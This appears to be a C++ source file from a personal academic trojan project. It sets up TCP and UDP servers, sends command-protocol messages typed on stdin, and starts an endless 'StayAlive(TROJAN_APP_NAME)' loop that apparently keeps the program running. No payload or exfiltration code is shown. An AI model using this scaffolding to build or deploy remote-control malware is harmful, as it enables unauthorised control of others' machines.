// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++ and C#: http://www.viva64.com

#include "..\Service\pch.hpp"

#include "Application.hpp"
#include "..\Network\TCP\TCPServer.hpp"
#include "..\Network\Protocols\CommandMessageProtocol.hpp"
#include "..\Service\Debugger.hpp"
#include "..\Service\Tools.hpp"
#include "..\Network\UDP\UDPServer.hpp"

Application::Application() :
	m_io(),
	m_tcp_server(new TCPServer(m_io, std::atoi(DEFAULT_PORT))),
	m_udp_server(new UDPServer(m_io, std::atoi(DEFAULT_PORT))),
	m_thread([this]() { m_io.run(); }),
	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
{ }

Application::Application(char *argv[]) :
	m_io(),
	m_tcp_server(new TCPServer(m_io, std::atoi(argv[1]))),
	m_udp_server(new UDPServer(m_io, std::atoi(argv[1]))),
	m_thread([this]() { m_io.run(); }),
	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
{ }

Application::~Application()
{ }

void Application::run()
{
	char line[CMPROTO::MAX_BODY_LENGTH + 1]{ };
	while (std::cin.getline(line, CMPROTO::MAX_BODY_LENGTH + 1))
	{
		CMPROTO msg;
		msg.set_body_length(std::strlen(line));
		std::memcpy(msg.get_body(), line, msg.get_body_length());
		msg.encode_header();

		m_tcp_server->write(&msg);
	}
}

void Application::close()
{
	m_thread.join();
	m_save_thread.join();
}
